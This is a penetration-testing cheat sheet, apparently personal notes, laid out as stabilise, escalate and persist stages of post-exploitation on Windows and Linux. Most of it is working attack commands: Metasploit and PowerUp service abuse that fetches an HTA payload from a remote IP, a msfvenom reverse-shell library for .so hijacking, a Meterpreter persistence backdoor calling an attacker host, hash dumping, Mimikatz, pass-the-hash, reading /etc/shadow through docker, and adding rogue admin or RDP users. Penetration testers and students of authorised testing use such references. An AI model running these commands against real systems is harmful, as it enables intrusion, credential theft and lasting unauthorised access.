# Stable (Stabilize session)
## MSF Migrate
* `migrate` to a process that has higher chances of not being killed (e.g. from browser processes to system processes)
* `run <double_tabs>` - select meterpreter scripts

# Privileged (PrivEsc sessions)
## Windows Privilege Escalation
#### Metasploit
* `meterpreter> getsystem` - doesn't work when UAC is enabled and user is not admin
* `meterpreter> use incognito` - use commands from this module (e.g. `list_tokens`)
  * if `impersonate_token` doesn't work, migrate to a different process first (e.g. _w3wp_)
* `run post/multi/recon/local_exploit_suggester`
</br>__UAC__</br>
* `meterpreter> run post/windows/gather/win_privs` - check UAC enabled
* `msf> search bypassuac` - `use` module, `set` configs and `exploit`
  * `meterpreter> getsystem` - will work if user on the new session is admin (with UAC enabled also)
* manual - https://github.com/hfiref0x/UACME

#### Tools
PowerUp - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</br>
* `. ./PowerUp.ps1`
* `Invoke-CheckAll`
* when running functuions from PowerUp remember to check commands of exploits
  * `Invoke-ServiceAbuse -Name AppReadiness -Command "net localgroup administrators bob /add"`
  * `Invoke-ServiceAbuse -Name AppReadiness  -Command "mshta.exe http://10.10.15.3:8080/ljUAsN.hta"`

WinPeas - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</br>

#### General
* unquoted service paths
  * `wmic service get name,displayname,pathname,startmode | findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """` - find unquoted services
  * `msf> use exploit/windows/local/unquoted_service_path` - module for exploiting unquoted path vulnerable instances
* abuse services
  * _AppReadiness_
    * add users to Administrators group - `sc config AppReadiness binPath= "cmd /c net localgroup Administrators <current-user> /add`
    * get system using Microsoft HTA (with powershell and PowerUp.ps1) - `Invoke-ServiceAbuse -Name AppReadiness  -Command "mshta.exe http://10.10.15.3:8080/ljUAsN.hta"`
 
#### DLL Hijacking (Windows)
* abuses the __DLL Search Order__
1. Directory from where the app is running
2. C:\Windows\System32 directory
3. C:\Windows\System directory
4. C:\Windows directory
5. Current directory at the time of execution
6. Any directory specified in %PATH%
* search privileges on destination folder
  * `get-acl 'c:\users\administrator\desktop\dvta\bin\release' | format-list` - check if current user has write permissions on destination folder


## Linux Privilege Escalation
* SUDO - https://gtfobins.github.io/
* SUID - https://gtfobins.github.io/#+suid
#### Metasploit
* msf> `use exploit/linux/local/glibc_origin_expansion_priv_esc` - glibc vulnerability
* msf> `use exploit/linux/local/*` - double tab
  
#### Tools
* `linux_exploit_suggester <-k kernel-version>` - https://github.com/The-Z-Labs/linux-exploit-suggester
* `kernelpop` - https://github.com/spencerdodd/kernelpop

#### General
* Replace executable
* crontab
* root squashing
* `man -P "id" man`
* docker sudo exploit
* escape from restricted shells - `rbash`
   * use _shell escapers_
   * `find /home/bob -name test -exec /bin/sh \;` - ! shell will execute only if the file exists: _-name **test**_
   * `python -c 'import pty;pty.spawn("/bin/sh")'`
   * `perl -e 'exec "/bin/sh"'`
   * `ssh <restricted_user>@server -t "/bin/sh"`
* Hijacking **.so** libraries
  * exploittion works the same way as DLL in windows
  * the executable must load the malicious .so using a user with elevated prvileges (root)
  1. determine the shared object libraries loaded
     * `ldd </usr/local/bin/program>` - note the name of looded .so files
  3. determine if theexecutable was compiled with RPATH or RUNPATH
     * `objdump -x </usr/local/bin/program> | grep RPATH`
     * `objdump -x </usr/local/bin/program> | grep RUNPATH`
  4. generate malicious .so with `msfvenom`
     * `msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<> LPORT=<> -f elf-so -o program.so`. !_program.so_ name must be found in loaded .so files found with `ldd`!
  5. copy the malicious files in one of the location used by the executable to load shared object libraries (higher up in the list the better)
* kernel exploits
* Unix socket exploitation
   * abuse through docker unix socket
      * `docker run -v /etc/shadow:/docker/hashedpasswords -d postgress`
      * `docker exec -ti <container_id> bash` - container ID from previous command
      * `root@docker_container: cat /docker/hashedpasswords > /docker/test.txt`
      * `root@docker_container: chmod 777 /docker/test.txt`
      * `root@docker_container: cat /docker/test.txt`

#### .so Hijacking (Linux)
* abuses the __.so Search Order__
1. any directory specified by `-rpath-link` option (RPATH)
2. any directories specified by `-rpath` options (RPATH)
3. content of environmental variables: `LD_RUN_PATH` and `LD_LIBRARY_PATH`
4. directories specified in environmental variables: `DT_RUNPATH` and `DT_RPATH`
5. `/lib` and `/usr/lib`
6. any directory specified in `/etc/ld.so.conf`

___________________________________________________________________________________________________________________________________________________________________________________________________________________________
# Persistent (maintaining access)
## Hashes
* `meterpreter> run hashdump` - if it crashes (elevate privileges or migrate to another process)
* `meterpreter> run post/windows/gather/smart_hashdump`
* pass-the-hash -> `use exploit/windows/smb/psexec` - works with administrator account (possible issues with users in Admin group, but not Administrator)
  * if no access to admin shares (Access_Denied in msf for psexec) - `meterpreter> reg setval -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System' -v LocalAccountTokenFilterPolicy -t REG_DWORD -d 1` and rerun psexec
* pass-the-hash over RDP -> `xfreerdp /u:<user> /d:<domain> /pth:<token> /v:<target>`

#### Mimikatz
* `sysinfo` - check on which processes meterpreter runs. It needs to be x64 for Mimikatz
* `ps -A x86_64 -s` list SYSTEM processes on x64 architecture
* msf> `migrate <PID>` - migrate to a x64 processes
* meterpreter> `load mimikatz`

#### MimiPenguin - Linux
* `./mimipenguin.sh` or `./mimipenguin.py`

## Enable RDP service
* `net start` - check enabled services
* `wmic service where 'Caption like "Remote%" and started=true' get Caption` - check enabled remote services
* `meterpreter> <service_manager/enum_services>`
* `meterpreter> run getui -e << -u <new_username> -p <new_password>>>` - enable RDP
* `net localgroup "<RDP-Group-With-Allow-Perm>" <user> /add` - add user to the group allowed to RDP connections

## Backdoor
* `run persistence -A -X -i 5 -p <port> -r <attacker_IP>` - works only on Windows
* start `exploit/multi/handler` with the above configs (port/IP/payload)

## New Users
* `net user <username> <passowrd> /add` - adds new user
* `net localgroup "<group_name>" <username> /add` - adds existing user to a specific group that allows external connections (RDP, telnet, ssh etc.)

## Cool Resources
* https://wiki.zacheller.dev/pentest/post-exploitation/maintaining-access
* https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
* https://csbygb.gitbook.io/pentips/windows/privesc
